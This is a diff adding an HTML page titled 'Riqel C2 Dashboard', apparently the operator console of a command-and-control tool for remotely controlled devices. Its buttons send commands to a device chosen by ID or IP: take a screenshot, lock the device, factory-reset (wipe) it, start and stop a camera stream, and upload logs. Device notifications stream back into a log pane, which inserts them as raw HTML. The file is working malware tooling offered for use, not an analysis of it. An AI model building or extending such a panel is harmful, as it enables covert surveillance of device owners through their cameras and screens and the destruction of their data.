@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head><title>Riqel C2 Dashboard</title>
+<script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
+<style>
+body { font-family: monospace; background: #0a0e27; color: #0f0; padding: 20px; }
+.device { border: 1px solid #0f0; margin: 10px; padding: 10px; }
+button { background: #1e2a3a; color: #0f0; border: 1px solid #0f0; padding: 5px 10px; cursor: pointer; }
+button:hover { background: #0f0; color: #000; }
+.log { background: #000; height: 300px; overflow-y: scroll; }
+</style>
+</head>
+<body>
+<h1>Riqel Cyber Admin</h1>
+<div><label>Device ID: <input id="deviceId" placeholder="e.g., device IP or ID"></label>
+<div class="commands">
+<button onclick="sendCommand('toast', {message:'Hello'})">Toast</button>
+<button onclick="sendCommand('screenshot', {})">Screenshot</button>
+<button onclick="sendCommand('lock', {})">Lock Device</button>
+<button onclick="sendCommand('wipe', {})">Factory Reset</button>
+<button onclick="sendCommand('start_camera', {})">Start Camera Stream</button>
+<button onclick="sendCommand('stop_camera', {})">Stop Camera Stream</button>
+<button onclick="sendCommand('upload_logs', {})">Upload Logs</button>
+</div></div>
+<div class="log" id="log"></div>
+<script>
+const socket = io();
+socket.on('notification', (data) => {
+    const log = document.getElementById('log');
+    log.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${JSON.stringify(data)}</div>`;
+    log.scrollTop = log.scrollHeight;
+});
+function sendCommand(action, args) {
+    const deviceId = document.getElementById('deviceId').value;
+    if (!deviceId) { alert('Enter device ID'); return; }
+    fetch('/admin/send_command', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({device_id: deviceId, command: action, args: args})
+    }).then(res => res.json()).then(data => console.log(data));
+}
+</script>
+</body>
+</html>
